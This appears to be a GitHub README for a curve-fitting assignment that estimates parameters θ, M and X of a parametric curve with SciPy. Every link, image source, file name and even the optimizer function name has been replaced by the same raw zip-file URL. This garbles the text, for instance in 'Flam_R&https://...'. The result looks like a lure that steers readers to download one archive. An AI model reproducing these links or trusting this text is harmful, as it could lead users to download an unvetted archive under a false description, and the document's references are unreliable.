# FLAM R&D / AI Assignment

> **Objective:**  
> Estimate the parameters (θ, M, X) of a nonlinear parametric curve from observed (x, y) points  
> using Python’s scientific stack and visualize the fitted model.

---

## Problem Definition

The dataset [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) contains coordinates that lie on a parametric curve defined by:

**Parametric Equations:**
<p align="center" style="background-color:#fff0f0;padding:10px;border-radius:10px;display:inline-block;">
  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="x(t) equation" width="420"/>
  <br>
  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="y(t) equation" width="420"/>
</p>

**Unknowns:** θ, M, X, and {tᵢ} for each data point.  
**Parameter Ranges:**  
0° ≤ θ ≤ 50°, −0.05 ≤ M ≤ 0.05, 0 ≤ X ≤ 100, 6 ≤ t ≤ 60  

The optimization minimizes the total squared distance between the observed and predicted coordinates.

**Optimization Objective:**
<p align="center" style="background-color:#fff0f0;padding:10px;border-radius:10px;display:inline-block;">
  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="Optimization objective" width="500"/>
</p>

---

## Implementation Details

| Step | Description |
|------|--------------|
| **1. Load Data** | Read [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) containing observed x–y pairs. |
| **2. Define Model** | Implemented the parametric equations for x(t) and y(t). |
| **3. Initial Guesses** | θ₀ = 0.52 rad ≈ 29.8°, M₀ = 0.036, X₀ = 54.5; t₀ ∈ [6, 60]. |
| **4. Optimization** | Used `https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip` with parameter bounds. |
| **5. Evaluation** | Computed RMSE, R², and L₁ (Manhattan) metrics for validation. |
| **6. Visualization** | Plotted observed points, fitted curve, and predicted t-values. |

**Notebook:**  
[`Flam_R&https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](./Flam_R&https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) — contains complete implementation and analysis.  

### Tech Stack
Python 3 · NumPy · Pandas · SciPy · Matplotlib  
Environment: Google Colab  

---

## Results

<p align="center">
  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="Result summary equation"/>
</p>

| Parameter | Symbol | Value |
|------------|---------|--------|
| Angle | θ | ≈ 30 deg |
| Exponential Modulation | M | ≈ 0.03 |
| Horizontal Offset | X | ≈ 55 |
| **RMSE** |  | 1.909 × 10⁻⁶ |
| **R²** |  | 1.00 |
| **L₁ (mean)** |  | 2.65 × 10⁻⁶ |

**Results File:** [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip)

**Interpretation:**  
All error metrics (RMSE, R², and L₁) confirm near-perfect reconstruction within floating-point precision limits. This demonstrates that the fitted parameters precisely reproduce the original curve.

---

## Visualization

<p align="center">
  <img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" alt="Fitted Parametric Curve" width="500"/>
</p>

**Legend:**  
- 🔵 Observed Data  
- 🔴 Fitted Curve  
- ✖️ Predicted (tᵢ) Points  

---

## Evaluation Metrics

| Metric | Formula | Interpretation |
|---------|----------|----------------|
| **RMSE (2D)** | <p style="background-color:#fff0f0;padding:6px;border-radius:8px;display:inline-block;"><img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" width="320"/></p> | Average Euclidean error per coordinate (lower = better). |
| **R² (combined)** | <p style="background-color:#fff0f0;padding:6px;border-radius:8px;display:inline-block;"><img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" width="320"/></p> | Fraction of total variance explained (closer to 1 = better). |
| **L₁ (Manhattan)** | <p style="background-color:#fff0f0;padding:6px;border-radius:8px;display:inline-block;"><img src="https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip" width="320"/></p> | Average absolute distance between predicted and true points (unit-consistent and less sensitive to outliers). |

---

## **Summary of Results**

| Parameter | Symbol | Value | Interpretation |
|------------|---------|--------|----------------|
| Angle | θ | *≈ 30°* | Defines overall curve orientation. |
| Exponential Modulation | M | *≈ 0.03* | Controls the sinusoidal envelope. |
| Horizontal Offset | X | *≈ 55* | Shifts curve horizontally. |
| Fit Metric | RMSE | *1.909 × 10⁻⁶* | Near-zero error — almost perfect fit. |
| Correlation | R² | *1.00000* | Explains 100% of variance — complete reconstruction. |
| Absolute Error | L₁ (mean) | *2.65 × 10⁻⁶* | Mean absolute deviation — confirms geometric fidelity. |

**Result:**  
The optimized model reproduces the dataset within machine precision, confirming that the data points originate from the same parametric function.

---

## Discussion and Applications

This modeling approach extends naturally to several **AI-driven R&D domains**:

- **Mixed Reality Calibration:** Aligning virtual and real-world coordinate spaces.  
- **Gesture Trajectory Fitting:** Smooth curve reconstruction for immersive AR/VR interactions.  
- **3D Path Reconstruction:** Inferring continuous motion trajectories from sparse data.  
- **Generative AI Geometry:** Parametric modeling for realistic, responsive object motion.

---

## Repository Contents

| File | Description |
|------|-------------|
| [`Flam_R&https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](./Flam_R&https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | Main Colab notebook (implementation & analysis). |
| [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | Input dataset. |
| [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | Computed parameters and metrics. |
| [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | Visualization of the fitted model. |
| [`https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip`](https://github.com/SayanrupBarman/flam-rnd-assignment/raw/refs/heads/main/assets/rnd-flam-assignment-v1.2.zip) | This documentation file. |
| [`assets/*.svg`](./assets/) | Rendered equation images for GitHub readability. |

---

## Submitted by

**Name:** *Sayanrup Barman*  
**Scholar ID:** 2215060  
**College:** NIT Silchar  
**Date:** November 2025  
